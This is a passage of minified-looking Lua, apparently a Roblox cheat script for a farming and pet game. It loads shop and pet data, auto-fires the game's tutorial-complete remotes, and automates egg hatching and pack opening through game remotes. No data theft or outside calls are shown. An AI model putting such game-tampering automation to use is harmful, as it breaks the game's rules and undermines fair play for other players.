				local a = y and y.Min or nil
				local H = y and y.Max or nil
				local r = V
				local Y = Z.GearData.GetPrice(i, V.Cost)
				if i then
					local G = {
						name = i;
						type = c,
						rarity = J,
						price = Y,
						icon_id = q.GetAssetId(E)
					}
					g.AllGearShopData[i] = G
					table.insert(g.AllGearShopTable, G)
				end
			end
		end
		return true
	end,
	GetGearShopDropDown = function()
		local G = {}
		for V, y in pairs(g.AllGearShopTable) do
			local j = tostring(y.name or "Unknown")
			local i = q.formatShecklesNumber(y.price)
			local c = tostring(y.rarity or "Unknown")
			local J = Z.Data.GetRarityColor(c)
			local T = string.format("<font color=\"#FFFFFF\">%s</font> <font color=\"#00FF00\">$%s</font> <font color=\"%s\">%s</font>", j, tostring(i), J, c)
			local d = {
				Text = T;
				Value = j
			}
			table.insert(G, d)
		end
		return G
	end,
	GetGeatItemDetails = function(G)
		return g.AllGearShopData[G]
	end;
	GetGearStockCurrent = function(G)
		local V = y.GearShop.Items:FindFirstChild(G)
		if V then
			return V.Value or 0
		end
		return nil
	end
}
Z.GearData.LoadAllGearData()
g.AllCrateShopData = {}
g.AllCrateShopTable = {}
g.CrateShopDataList = {}
Z.CrateData = {
	GetPriceCrateData = function(G, V)
		local Z = y.CrateShopFlags and y.CrateShopFlags.PriceOverrides
		if Z and type(Z.Get) == "function" then
			local V = Z:Get()
			local y = type(V) == "table" and V[G]
			if type(y) == "number" and y >= 0 then
				return y
			end
		end
		return V
	end;
	LoadAllCrateData = function()
		table.clear(g.AllCrateShopData)
		table.clear(g.AllCrateShopTable)
		local G = y.CrateData
		if type(G) ~= "table" or type(G.GetAllCrates) ~= "function" then
			warn("[CrateData] Crate data was not found")
			return false
		end
		local V, j = pcall(G.GetAllCrates)
		if not V or type(j) ~= "table" then
			warn("[CrateData] Failed to read crate data")
			return false
		end
		for G, V in ipairs(j) do
			if type(V) ~= "table" then
				continue
			end
			local y = tostring(V.Name or V.ItemName or "")
			if y == "" then
				continue
			end
			local j = V.RestockValues
			local i = nil
			local c = nil
			if typeof(j) == "NumberRange" then
				i = j.Min
				c = j.Max
			elseif type(j) == "table" then
				i = j.Min
				c = j.Max
			end
			local J = {
				name = y;
				type = tostring(V.CrateType or "Crate"),
				rarity = tostring(V.Rarity or "Unknown"),
				price = Z.CrateData.GetPriceCrateData(y, tonumber(V.Cost) or 0),
				icon_id = q.GetAssetId(V.IMG);
				restock_min = tonumber(i) or 0,
				restock_max = tonumber(c) or 0;
				raw = V
			}
			g.AllCrateShopData[y] = J
			table.insert(g.AllCrateShopTable, J)
		end
		table.sort(g.AllCrateShopTable, function(G, V)
			local y = g.RarityRank[tostring(G.rarity or "")] or 0
			local Z = g.RarityRank[tostring(V.rarity or "")] or 0
			if y ~= Z then
				return y > Z
			end
			if tonumber(G.price) ~= tonumber(V.price) then
				return ((tonumber(G.price) or 0)) > ((tonumber(V.price) or 0))
			end
			return tostring(G.name or "") < tostring(V.name or "")
		end)
		return true
	end;
	LoadValidCratesForShop = function()
		table.clear(g.CrateShopDataList)
		if y.CrateShop and y.CrateShop.Items then
			for G, V in ipairs(y.CrateShop.Items:GetChildren()) do
				local y = tostring(V.Name or "")
				if y ~= "" and g.AllCrateShopData[y] then
					g.CrateShopDataList[y] = true
				end
			end
		end
		if next(g.CrateShopDataList) == nil then
			for G in pairs(g.AllCrateShopData) do
				g.CrateShopDataList[G] = true
			end
		end
		return true
	end,
	GetCrateShopDropDown = function()
		local G = {}
		for V, y in ipairs(g.AllCrateShopTable) do
			local j = tostring(y.name or "")
			if j == "" or not g.CrateShopDataList[j] then
				continue
			end
			local i = q.formatShecklesNumber(y.price)
			local c = tostring(y.rarity or "Unknown")
			local J = tostring(y.type or "Crate")
			local T = Z.Data.GetRarityColor(c)
			local d = string.format("<font color=\"#FFFFFF\">%s</font> <font color=\"#00FF00\">$%s</font> <font color=\"%s\">%s</font> <font color=\"#FFFFFF\">%s</font>", j, tostring(i), T, c, J)
			table.insert(G, {
				Text = d,
				Value = j
			})
		end
		return G
	end,
	GetCrateItemDetails = function(G)
		return g.AllCrateShopData[G]
	end,
	GetCrateStockCurrent = function(G)
		G = tostring(G or "")
		if G == "" or not y.CrateShop or not y.CrateShop.Items then
			return 0
		end
		local V = y.CrateShop.Items:FindFirstChild(G)
		if not V then
			return 0
		end
		return tonumber(V.Value) or 0
	end
}
Z.CrateData.LoadAllCrateData()
Z.CrateData.LoadValidCratesForShop()
Y.ShopMigration = {
	HasExistingSaveShopMigration = function()
		return type(isfile) == "function" and isfile(m)
	end,
	BuildSelectedFromAvoidShopMigration = function(G, V)
		local y = {}
		V = type(V) == "table" and V or {}
		if type(G) ~= "table" then
			return y
		end
		for G, Z in pairs(G) do
			local j = ""
			if type(G) == "string" then
				j = G
			elseif type(Z) == "table" then
				j = tostring(Z.name or Z.ItemName or Z.SeedName or "")
			elseif type(Z) == "string" then
				j = Z
			end
			if j ~= "" and V[j] ~= true then
				y[j] = true
			end
		end
		return y
	end,
	RunSelectedShopMigration = function()
		if h.shop_selected_migration_v1 == true then
			return false
		end
		if not Y.ShopMigration.HasExistingSaveShopMigration() then
			h.shop_selected_migration_v1 = true
			return false
		end
		h.seed_shop_buy_selected = Y.ShopMigration.BuildSelectedFromAvoidShopMigration(g.SeedShopDataList, h.seed_avoid)
		h.gear_shop_buy_selected = Y.ShopMigration.BuildSelectedFromAvoidShopMigration(g.AllGearShopData, h.gear_shop_avoid)
		h.crate_shop_buy_selected = type(h.crate_shop_buy_selected) == "table" and h.crate_shop_buy_selected or {}
		h.enabled_crate_shop = h.enabled_crate_shop == true
		h.shop_selected_migration_v1 = true
		a.Save.SaveDataSync()
		return true
	end
}
Y.ShopMigration.RunSelectedShopMigration()
Z.GameApi.Start()
Z.AutoTutorial = {
	StartedAutoTutorial = false;
	GetRemotesAutoTutorial = function()
		local G = y.Networking and y.Networking.Tutorial
		if type(G) ~= "table" then
			return nil
		end
		return G
	end;
	HideUiAutoTutorial = function()
		pcall(function()
			workspace:SetAttribute("InTutorial", nil)
		end)
		local G = y.PlayerGui and y.PlayerGui:FindFirstChild("TutorialUI")
		if G and G:IsA("ScreenGui") then
			G.Enabled = false
		end
		return true
	end,
	FireCompleteAutoTutorial = function()
		local G = Z.AutoTutorial.GetRemotesAutoTutorial()
		if not G then
			return false, "Tutorial remotes missing"
		end
		if G.Ready and type(G.Ready.Fire) == "function" then
			pcall(function()
				G.Ready:Fire()
			end)
		end
		if not G.Complete or type(G.Complete.Fire) ~= "function" then
			return false, "Tutorial complete remote missing"
		end
		local V, y = pcall(function()
			G.Complete:Fire()
		end)
		if not V then
			return false, tostring(y or "Tutorial complete failed")
		end
		Z.AutoTutorial.HideUiAutoTutorial()
		return true, "Tutorial complete fired"
	end;
	StartAutoTutorial = function()
		if Z.AutoTutorial.StartedAutoTutorial then
			return false
		end
		Z.AutoTutorial.StartedAutoTutorial = true
		local G = Z.AutoTutorial.GetRemotesAutoTutorial()
		if not G then
			return false
		end
		if G.Start and G.Start.OnClientEvent then
			G.Start.OnClientEvent:Connect(function()
				task.defer(function()
					for G = 1, 4, 1 do
						Z.AutoTutorial.FireCompleteAutoTutorial()
						task.wait(.15)
					end
				end)
			end)
		end
		task.spawn(function()
			local G = os.clock()
			while not g.is_forced_stop and os.clock() - G < 16 do
				Z.AutoTutorial.FireCompleteAutoTutorial()
				task.wait(.75)
			end
		end)
		return true
	end
}
Z.AutoTutorial.StartAutoTutorial()
g.PetRarity = {}
g.PetDataTable = {}
g.PetDataFast = {}
Z.PetData = {
	LoadAllPetData = function()
		table.clear(g.PetRarity)
		table.clear(g.PetDataTable)
		table.clear(g.PetDataFast)
		for G, V in pairs(y.PetData) do
			if type(V) == "table" and type(V.DisplayName) == "string" then
				local y = V.DisplayName
				local Z = V.Rarity
				local j = V.BasePrice
				local i = V.SpawnChance
				local c = {
					petname = G;
					displayname = y;
					price = j,
					chance = i,
					rarity = Z
				}
				g.PetDataFast[y] = c
				g.PetRarity[y] = Z
				table.insert(g.PetDataTable, c)
			end
		end
	end;
	GetDropDownPets = function()
		local G = {}
		for V, y in pairs(g.PetDataFast) do
			local j = tostring(y.displayname or "Unknown")
			local i = q.formatShecklesNumber(y.price)
			local c = tostring(y.rarity or "Unknown")
			local J = tostring(y.chance or "0")
			local T = Z.Data.GetRarityColor(c)
			local d = string.format("<font color=\"#FFFFFF\">%s</font> <font color=\"#00FF00\">$%s</font> <font color=\"%s\">%s</font> (%s)", j, tostring(i), T, c, J)
			local u = {
				Text = d,
				Value = j
			}
			table.insert(G, u)
		end
		return G
	end
}
Z.PetData.LoadAllPetData()
g.EggHatcherStatusText = ""
g.SeedPackOpenerStatusText = ""
g.PackOpeningWebhookStatusText = ""
g.EggHatcherWebhookData = g.EggHatcherWebhookData or {}
g.SeedPackOpenerWebhookData = g.SeedPackOpenerWebhookData or {}
g.EggHatcherPetKeepUiRefs = g.EggHatcherPetKeepUiRefs or {}
Z.SystemPause = {
	IsEggHatcherPauseActiveSystemPause = function()
		return h.egg_hatcher_pause_other_systems == true and (Z.EggHatcher and (type(Z.EggHatcher.IsActiveEggHatcher) == "function" and Z.EggHatcher.IsActiveEggHatcher() == true))
	end,
	IsPausedSystemPause = function(G)
		return Z.SystemPause.IsEggHatcherPauseActiveSystemPause()
	end
}
Z.PackOpenHelpers = {
	BusyPackOpenHelpers = false,
	RetryAtPackOpenHelpers = setmetatable({}, {
		__mode = "k"
	});
	SelectionIsEmptyPackOpenHelpers = function(G)
		if type(G) ~= "table" then
			return true
		end
		for G, V in pairs(G) do
			if V == true or type(G) == "number" and tostring(V or "") ~= "" then
				return false
			end
		end
		return true
	end,
	IsSelectedPackOpenHelpers = function(G, V)
		if type(G) ~= "table" then
			return false
		end
		V = tostring(V or "")
		if V == "" then
			return false
		end
		if G[V] == true then
			return true
		end
		for G, y in pairs(G) do
			if tostring(y or "") == V then
				return true
			end
		end
		return false
	end;
	PassesSelectedPackOpenHelpers = function(G, V)
		return Z.PackOpenHelpers.SelectionIsEmptyPackOpenHelpers(G) or Z.PackOpenHelpers.IsSelectedPackOpenHelpers(G, V)
	end;
	PassesNameFilterPackOpenHelpers = function(G, V, y)
		y = tostring(y or "")
		if y == "" then
			return false
		end
		if Z.PackOpenHelpers.IsSelectedPackOpenHelpers(V, y) then
			return false
		end
		return Z.PackOpenHelpers.PassesSelectedPackOpenHelpers(G, y)
	end,
	GetToolCountPackOpenHelpers = function(G)
		if not G or not G.Parent then
			return 0
		end
		local V = G:GetAttribute("Count") or G:GetAttribute("Amount") or G:GetAttribute("Quantity") or 1
		return math.max(math.floor(tonumber(V) or 1), 1)
	end,
	GetToolsWithAttributePackOpenHelpers = function(G)
		local V = {}
		for y, Z in ipairs(Z.Backpack.GetBackpackAllItems()) do
			if Z and Z:IsA("Tool") then
				local y = Z:GetAttribute(G)
				if type(y) == "string" and y ~= "" then
					table.insert(V, Z)
				end
			end
		end
		return V
	end;
	GetNextToolPackOpenHelpers = function(G, V, y)
		local j = Z.PackOpenHelpers.GetToolsWithAttributePackOpenHelpers(G)
		table.sort(j, function(V, y)
			local Z = tostring(V:GetAttribute(G) or V.Name or "")
			local j = tostring(y:GetAttribute(G) or y.Name or "")
			if Z ~= j then
				return Z < j
			end
			return tostring(V.Name or "") < tostring(y.Name or "")
		end)
		for j, i in ipairs(j) do
			if not i or not i.Parent then
				continue
			end
			if os.clock() < ((Z.PackOpenHelpers.RetryAtPackOpenHelpers[i] or 0)) then
				continue
			end
			local c = tostring(i:GetAttribute(G) or "")
			if Z.PackOpenHelpers.GetToolCountPackOpenHelpers(i) > 0 and Z.PackOpenHelpers.PassesNameFilterPackOpenHelpers(V, y, c) then
				return i, c
			end
		end
		return nil, ""
	end,
	GetEggDataPackOpenHelpers = function(G)
		if type(y.EggData) ~= "table" or type(y.EggData.GetData) ~= "function" then
			return nil
		end
		local V, Z = pcall(y.EggData.GetData, G)
		return V and (type(Z) == "table" and Z) or nil
	end;
	GetSeedPackDataPackOpenHelpers = function(G)
		if type(y.SeedPackData) ~= "table" or type(y.SeedPackData.GetData) ~= "function" then
			return nil
		end
		local V, Z = pcall(y.SeedPackData.GetData, G)
		return V and (type(Z) == "table" and Z) or nil
	end;
	GetPetDisplayNamePackOpenHelpers = function(G)
		G = tostring(G or "")
		local V = type(y.PetData) == "table" and y.PetData[G] or nil
		return type(V) == "table" and tostring(V.DisplayName or G) or G
	end;
	GetPetRarityPackOpenHelpers = function(G)
		G = tostring(G or "")
		local V = type(y.PetData) == "table" and y.PetData[G] or nil
		return type(V) == "table" and tostring(V.Rarity or "Unknown") or "Unknown"
	end;
	GetSeedRarityPackOpenHelpers = function(G)
		G = tostring(G or "")
		local V = g.SeedDataFast and g.SeedDataFast[G] or nil
		return type(V) == "table" and tostring(V.rarity or "Unknown") or "Unknown"
	end;
	NormaliseSizePackOpenHelpers = function(G)
		G = tostring(G or "")
		if G == "" then
			return "Normal"
		end
		if type(y.PetSizes) == "table" and type(y.PetSizes.Normalize) == "function" then
			local V, Z = pcall(y.PetSizes.Normalize, G)
			if V and (type(Z) == "string" and Z ~= "") then
				G = Z
			end
		end
		if G == "Big" or G == "Huge" then
			return G
		end
		return "Normal"
	end;
	NormaliseVariantPackOpenHelpers = function(G)
		G = tostring(G or "")
		return G ~= "" and G or "Normal"
	end,
	GetRarityDropdownPackOpenHelpers = function()
		local G = {}
		for V in pairs(g.RarityRank or {}) do
			local y = Z.Data.GetRarityColor(V)
			table.insert(G, {
				Text = string.format("<font color=\'%s\'>%s</font>", y, V);
				Value = V,
				Rank = g.RarityRank[V] or 0
			})
		end
		table.sort(G, function(G, V)
			return ((G.Rank or 0)) < ((V.Rank or 0))
		end)
		return G
	end;
	GetSizeDropdownPackOpenHelpers = function()
		local G = {
			"Normal",
			"Big",
			"Huge"
		}
		local V = {}
		for G, y in ipairs(G) do
			table.insert(V, {
				Text = y;
				Value = y
			})
		end
		return V
	end;
	GetVariantDropdownPackOpenHelpers = function()
		return {
			{
				Text = "Normal";
				Value = "Normal"
			},
			{
				Text = "Rainbow",
				Value = "Rainbow"
			}
		}
	end;
	GetEggDropdownPackOpenHelpers = function()
		local G = {}
		local V = type(y.EggData) == "table" and y.EggData.Data or {}
		for V, y in ipairs(type(V) == "table" and V or {}) do
			if type(y) == "table" and type(y.EggName) == "string" then
				local V = tostring(y.Rarity or "Unknown")
				local j = Z.Data.GetRarityColor(V)
				table.insert(G, {
					Text = string.format("<font color=\'#FFFFFF\'>%s</font> <font color=\'%s\'>%s</font>", y.EggName, j, V),
					Value = y.EggName;
					Rank = g.RarityRank[V] or 0
				})
			end
		end
		table.sort(G, function(G, V)
			if ((G.Rank or 0)) ~= ((V.Rank or 0)) then
				return ((G.Rank or 0)) < ((V.Rank or 0))
			end
			return tostring(G.Value or "") < tostring(V.Value or "")
		end)
		return G
	end;
	GetSeedPackDropdownPackOpenHelpers = function()
		local G = {}
		local V = type(y.SeedPackData) == "table" and y.SeedPackData.Data or {}
		for V, y in ipairs(type(V) == "table" and V or {}) do
			if type(y) == "table" and type(y.PackName) == "string" then
				local V = tostring(y.Rarity or "Unknown")
				local j = Z.Data.GetRarityColor(V)
				table.insert(G, {
					Text = string.format("<font color=\'#FFFFFF\'>%s</font> <font color=\'%s\'>%s</font>", y.PackName, j, V),
					Value = y.PackName;
					Rank = g.RarityRank[V] or 0
				})
			end
		end
		table.sort(G, function(G, V)
			if ((G.Rank or 0)) ~= ((V.Rank or 0)) then
				return ((G.Rank or 0)) < ((V.Rank or 0))
			end
			return tostring(G.Value or "") < tostring(V.Value or "")
		end)
		return G
	end;
	GetPetDropdownPackOpenHelpers = function()
		local G = {}
		for V, y in ipairs(g.PetDataTable or {}) do
			local j = tostring(y.petname or "")
			if j ~= "" then
				local V = tostring(y.displayname or j)
				local i = tostring(y.rarity or "Unknown")
				local c = Z.Data.GetRarityColor(i)
				table.insert(G, {
					Text = string.format("<font color=\'#FFFFFF\'>%s</font> <font color=\'%s\'>%s</font>", V, c, i);
					Value = j,
					Rank = g.RarityRank[i] or 0
				})
			end
		end
		table.sort(G, function(G, V)
			if ((G.Rank or 0)) ~= ((V.Rank or 0)) then
				return ((G.Rank or 0)) > ((V.Rank or 0))
			end
			return tostring(G.Value or "") < tostring(V.Value or "")
		end)
		return G
	end,
	GetSeedDropdownPackOpenHelpers = function()
		local G = {}
		for V, y in ipairs(g.AllSeedsDataTable or {}) do
			local j = tostring(y.name or "")
			if j ~= "" then
				local V = tostring(y.rarity or "Unknown")
				local i = Z.Data.GetRarityColor(V)
				table.insert(G, {
					Text = string.format("<font color=\'#FFFFFF\'>%s</font> <font color=\'%s\'>%s</font>", j, i, V),
					Value = j,
					Rank = g.RarityRank[V] or 0
				})
			end
		end
		table.sort(G, function(G, V)
			if ((G.Rank or 0)) ~= ((V.Rank or 0)) then
				return ((G.Rank or 0)) > ((V.Rank or 0))
			end
			return tostring(G.Value or "") < tostring(V.Value or "")
		end)
		return G
	end;
	OpenToolByRemotePackOpenHelpers = function(G, V, j, i)
		if not G or not G.Parent then
			return false, "Tool missing"
		end
		local c = tostring(G:GetAttribute(V) or "")
		if c == "" then
			return false, "Invalid tool"
		end
		if not j or type(j.Fire) ~= "function" then
			return false, "Open remote missing"
		end
		local J = Z.Player.GetTool_Holding()
		if i == true and G.Parent ~= y.Character then
			if not Z.Player.EquipTool(G) then
				return false, "Could not equip tool"
			end
			task.wait(.1)
		end
		local T, d = pcall(function()
			return j:Fire(c)
		end)
		if J and (J.Parent and (J ~= G and J.Parent ~= y.Character)) then
			pcall(function()
				Z.Player.EquipTool(J)
			end)
		end
		if not T then
			return false, tostring(d or "Open failed")
		end
		if type(d) == "table" then
			if d.Success == true then
				return true, d
			end
			return false, tostring(d.Message or d.Reason or d.Error or "Open rejected"), d
		end
		if d == true then
			return true, d
		end
		return false, "Open rejected", d
	end,
	RunOpenCyclePackOpenHelpers = function(G)
		if type(G) ~= "table" or Z.PackOpenHelpers.BusyPackOpenHelpers then
			return false
		end
		if G.enabled ~= true then
			G.setStatus("")
			return false
		end
		if not q.IsLoadingCompleted() then
			G.setStatus("Waiting for loading", "#FFCC66")
			return false
		end
		local V = math.clamp(math.floor(tonumber(G.maxPerCycle) or 1), 1, 1000)
		local y = math.clamp(tonumber(G.delay) or .35, .15, 10)
		Z.PackOpenHelpers.BusyPackOpenHelpers = true
		local j = 0
		local i, c = pcall(function()
			for V = 1, V, 1 do
				local i, c = Z.PackOpenHelpers.GetNextToolPackOpenHelpers(G.attributeName, G.selected, G.protected)
				if not i then
					if j == 0 then
						G.setStatus("No matching tools", "#CFCFCF")
					end
					break
				end
				local J, T = Z.PackOpenHelpers.OpenToolByRemotePackOpenHelpers(i, G.attributeName, G.remote, G.shouldEquip)
				if J then
					j += 1
					if type(G.onOpened) == "function" then
						local V, y = pcall(G.onOpened, c, i)
						if not V then
							warn("[PackOpenHelpers onOpened]", y)
						end
					end
					G.setStatus("Opened " .. (tostring(c) .. (" x" .. tostring(j))), "#7CFC00")
					task.wait(y)
				else
					Z.PackOpenHelpers.RetryAtPackOpenHelpers[i] = os.clock() + 2
					G.setStatus(tostring(T or "Open failed"), "#FF6666")
					break
				end
			end
		end)
		Z.PackOpenHelpers.BusyPackOpenHelpers = false
		if not i then
			G.setStatus("System error", "#FF6666")
			warn("[PackOpenHelpers]", c)
			return false
		end
		return j > 0
	end
}
Z.EggHatcher = {
	ActiveUntilEggHatcher = 0,
	OpenedForRejoinEggHatcher = 0,
	LastOpenAtEggHatcher = 0;
	NoToolAtEggHatcher = 0;
	ResultRejoinAtEggHatcher = 0;
	ResultRejoinMatchedEggHatcher = false,
	StartedRejoinWatcherEggHatcher = false;
	FailedRejoinCalled = false,
	ProcessedResultsForRejoinEggHatcher = 0,
	ResultOpenIdsForRejoinEggHatcher = {};
	LastNonMatchingResultEggHatcher = nil,
	SetStatusEggHatcher = function(G, V)
		G = tostring(G or "")
		if G == "" then
			g.EggHatcherStatusText = ""
			return false
		end
		g.EggHatcherStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\165\154 [Egg Hatcher]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
		return true
	end;
	StartStopHatchingButtonEggHatcher = function()
		if h.egg_hatcher_enabled ~= true or h.egg_hatcher_rejoin_after_hatch ~= true then
			return false
		end
		if Z.EggHatcher.StartedStopHatchingButtonEggHatcher == true then
			return false
		end
		Z.EggHatcher.StartedStopHatchingButtonEggHatcher = true
		local G = y.PlayerGui or y.LocalPlayer:WaitForChild("PlayerGui")
		local V = G:FindFirstChild("EggHatcherStopGui")
		if V then
			V:Destroy()
		end
		if T and type(T.Toggle) == "function" then
			local G = pcall(function()
				T:Toggle(false)
			end)
		end
		local j = Instance.new("ScreenGui")
		j.Name = "EggHatcherStopGui"
		j.ResetOnSpawn = false
		j.IgnoreGuiInset = true
		j.DisplayOrder = 2147483647
		j.Parent = G
		local i = Instance.new("TextButton")
		i.Name = "StopHatchingButton"
		i.AnchorPoint = Vector2.new(.5, 0)
		i.Position = UDim2.fromScale(.5, .08)
		i.Size = UDim2.fromOffset(420, 74)
		i.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
		i.BorderSizePixel = 0
		i.Text = "STOP HATCHING"
		i.TextColor3 = Color3.fromRGB(255, 255, 255)
		i.TextScaled = true
		i.Font = Enum.Font.GothamBlack
		i.Parent = j
		local c = Instance.new("UICorner")
		c.CornerRadius = UDim.new(0, 12)
		c.Parent = i
		i.MouseButton1Click:Connect(function()
			h.egg_hatcher_enabled = false
			Z.EggHatcher.ResultRejoinAtEggHatcher = 0
			Z.EggHatcher.ResultRejoinMatchedEggHatcher = false
			Z.EggHatcher.OpenedForRejoinEggHatcher = 0
			Z.EggHatcher.LastOpenAtEggHatcher = 0
			Z.EggHatcher.NoToolAtEggHatcher = 0
			Z.EggHatcher.FailedRejoinCalled = false
			Z.EggHatcher.ResetResultTrackingEggHatcher()
			a.Save.SaveDataSync()
			j:Destroy()
		end)
		return true
	end,
	MarkActiveEggHatcher = function(G)
		G = math.max(tonumber(G) or 0, 0)
		Z.EggHatcher.ActiveUntilEggHatcher = math.max(Z.EggHatcher.ActiveUntilEggHatcher, os.clock() + G)
		return true
	end;
	IsActiveEggHatcher = function()
		return h.egg_hatcher_enabled == true and os.clock() < Z.EggHatcher.ActiveUntilEggHatcher
	end,
	GetRejoinOpenLimitEggHatcher = function()
		if h.egg_hatcher_rejoin_after_hatch ~= true then
			return 0
		end
		return math.max(math.floor(tonumber(h.egg_hatcher_rejoin_open_limit) or 0), 0)
	end,
	CanOpenMoreForRejoinEggHatcher = function()
		if h.egg_hatcher_rejoin_after_hatch ~= true then
			return true
		end
		if ((tonumber(Z.EggHatcher.ResultRejoinAtEggHatcher) or 0)) > 0 then
			Z.EggHatcher.SetStatusEggHatcher("Waiting for rejoin", "#FFCC66")
			return false
		end
		local G = Z.EggHatcher.GetRejoinOpenLimitEggHatcher()
		if G <= 0 then
			return true
		end
		if Z.EggHatcher.OpenedForRejoinEggHatcher >= G then
			Z.EggHatcher.MarkActiveEggHatcher(3)
			Z.EggHatcher.SetStatusEggHatcher("Waiting for hatch result " .. (tostring(Z.EggHatcher.OpenedForRejoinEggHatcher) .. ("/" .. tostring(G))), "#FFCC66")
			return false
		end
		return true
	end;
	GetMaxPerCycleEggHatcher = function()
		local G = math.clamp(math.floor(tonumber(h.egg_hatcher_max_per_cycle) or 1), 1, 1000)
		local V = Z.EggHatcher.GetRejoinOpenLimitEggHatcher()
		if V <= 0 then
			return G
		end
		local y = V - Z.EggHatcher.OpenedForRejoinEggHatcher
		if y <= 0 then
			return 0
		end
		return math.min(G, y)
	end;
	MarkOpenedForRejoinEggHatcher = function(G)
		if h.egg_hatcher_rejoin_after_hatch ~= true then
			return false
		end
		Z.EggHatcher.OpenedForRejoinEggHatcher += 1
		Z.EggHatcher.LastOpenAtEggHatcher = os.clock()
		Z.EggHatcher.NoToolAtEggHatcher = 0
		return true
	end,
	HasKeepFiltersEggHatcher = function()
		return not Z.PackOpenHelpers.SelectionIsEmptyPackOpenHelpers(h.egg_hatcher_keep_pets) or not Z.PackOpenHelpers.SelectionIsEmptyPackOpenHelpers(h.egg_hatcher_keep_rarities) or not Z.PackOpenHelpers.SelectionIsEmptyPackOpenHelpers(h.egg_hatcher_keep_sizes) or not Z.PackOpenHelpers.SelectionIsEmptyPackOpenHelpers(h.egg_hatcher_keep_variants)
	end;
	IsSuperRarityEggHatcher = function(G)
		local V = g.RarityRank[tostring(G or "")] or 0
		return V >= ((g.RarityRank.Super or 7))
	end,
	EnsureDefaultPetKeepFiltersEggHatcher = function()
		if type(h.egg_hatcher_pet_keep_filters) ~= "table" then
			h.egg_hatcher_pet_keep_filters = {}
		end
		local G = false
		for V, y in ipairs(g.PetDataTable or {}) do
			local j = tostring(y.petname or "")
			if j ~= "" and (Z.EggHatcher.IsSuperRarityEggHatcher(y.rarity) and h.egg_hatcher_pet_keep_filters[j] == nil) then
				h.egg_hatcher_pet_keep_filters[j] = {
					enabled = true,
					size = {},
					variant = {}
				}
				G = true
			end
		end
		if G then
			a.Save.SaveData()
		end
		return G
	end;
	FormatPetKeepSelectionEggHatcher = function(G)
		if Z.PackOpenHelpers.SelectionIsEmptyPackOpenHelpers(G) then
			return "Any"
		end
		local V = {}
		for G, y in pairs(G) do
			if y == true then
				table.insert(V, tostring(G))
			elseif type(G) == "number" and tostring(y or "") ~= "" then
				table.insert(V, tostring(y))
			end
		end
		table.sort(V)
		if # V > 0 then
			return table.concat(V, ", ")
		end
		return "Any"
	end,
	GetPetKeepFilterTextEggHatcher = function(G, V, y)
		if type(V) ~= "table" then
			V = {}
		end
		local j = ""
		if type(y) == "number" then
			j = " Case " .. tostring(y + 1)
		end
		return string.format("\240\159\144\190 %s%s [%s] [%s]", Z.PackOpenHelpers.GetPetDisplayNamePackOpenHelpers(G), j, Z.EggHatcher.FormatPetKeepSelectionEggHatcher(V.size), Z.EggHatcher.FormatPetKeepSelectionEggHatcher(V.variant))
	end,
	GetPetKeepFilterUiKeyEggHatcher = function(G, V)
		G = tostring(G or "")
		local y = 0
		for V = 1, # G, 1 do
			y = ((y * 31 + string.byte(G, V))) % 100000000
		end
		local Z = (G:gsub("[^%w_]", "_")):sub(1, 40)
		if Z == "" then
			Z = "pet"
		end
		local j = "main"
		if type(V) == "number" then
			j = "case_" .. tostring(V)
		end
		return "egg_hatcher_pet_keep_filter_" .. (Z .. ("_" .. (tostring(y) .. ("_" .. j))))
	end;
	GetSortedPetKeepFiltersEggHatcher = function()
		local G = {}
		local V = {}
		if type(h.egg_hatcher_pet_keep_filters) == "table" then
			V = h.egg_hatcher_pet_keep_filters
		end
		for V, y in pairs(V) do
			V = tostring(V or "")
			if V ~= "" and type(y) == "table" then
				table.insert(G, {
					pet = V;
					rule = y
				})
				if type(y.cases) == "table" then
					for y, Z in ipairs(y.cases) do
						if type(Z) == "table" then
							table.insert(G, {
								pet = V;
								rule = Z,
								caseIndex = y
							})
						end
					end
				end
			end
		end
		table.sort(G, function(G, V)
			local y = Z.PackOpenHelpers.GetPetRarityPackOpenHelpers(G.pet)
			local j = Z.PackOpenHelpers.GetPetRarityPackOpenHelpers(V.pet)
			local i = g.RarityRank[y] or 0
			local c = g.RarityRank[j] or 0
			if i ~= c then
				return i > c
			end
			if tostring(G.pet or "") ~= tostring(V.pet or "") then
				return tostring(G.pet or "") < tostring(V.pet or "")
			end
			return ((tonumber(G.caseIndex) or 0)) < ((tonumber(V.caseIndex) or 0))
		end)
		return G
	end;
	RefreshPetKeepFiltersUiEggHatcher = function()
		local G = g.EggHatcherPetKeepUiRefs
		if type(G) == "table" and type(G.RefreshRowsEggHatcherPetKeep) == "function" then
			G.RefreshRowsEggHatcherPetKeep()
		end
		return true
	end;
	SavePetKeepFilterEggHatcher = function(G, V, y)
		G = tostring(G or "")
		if G == "" then
			return false, "Select a pet first"
		end
		if type(h.egg_hatcher_pet_keep_filters) ~= "table" then
			h.egg_hatcher_pet_keep_filters = {}
		end
		local j = {}
		local i = {}
		local c = nil
		local J = h.egg_hatcher_pet_keep_filters[G]
		if type(V) == "table" then
			j = V
		end
		if type(y) == "table" then
			i = y
		end
		if type(J) == "table" and type(J.cases) == "table" then
			c = a.Config.CopyTable(J.cases)
		end
		h.egg_hatcher_pet_keep_filters[G] = {
			enabled = true,
			size = a.Config.CopyTable(j);
			variant = a.Config.CopyTable(i);
			cases = c
		}
		a.Save.SaveDataSync()
		Z.EggHatcher.RefreshPetKeepFiltersUiEggHatcher()
		return true
	end;
	AddPetKeepFilterCaseEggHatcher = function(G, V, y)
		G = tostring(G or "")
		if G == "" then
			return false, "Select a pet first"
		end
		if type(h.egg_hatcher_pet_keep_filters) ~= "table" then
			h.egg_hatcher_pet_keep_filters = {}
		end
		if type(h.egg_hatcher_pet_keep_filters[G]) ~= "table" then
			h.egg_hatcher_pet_keep_filters[G] = {
				enabled = false;
				size = {};
				variant = {}
			}
		end
		local j = h.egg_hatcher_pet_keep_filters[G]
		local i = {}
		local c = {}
		if type(V) == "table" then
			i = V
		end
		if type(y) == "table" then
			c = y
		end
		if type(j.cases) ~= "table" then
			j.cases = {}
		end
		table.insert(j.cases, {
			enabled = true,
			size = a.Config.CopyTable(i);
			variant = a.Config.CopyTable(c)
		})
		a.Save.SaveDataSync()
		Z.EggHatcher.RefreshPetKeepFiltersUiEggHatcher()
		return true
	end,
	TogglePetKeepFilterEggHatcher = function(G, V, y)
		G = tostring(G or "")
		if G == "" or type(h.egg_hatcher_pet_keep_filters) ~= "table" or type(h.egg_hatcher_pet_keep_filters[G]) ~= "table" then
			return false
		end
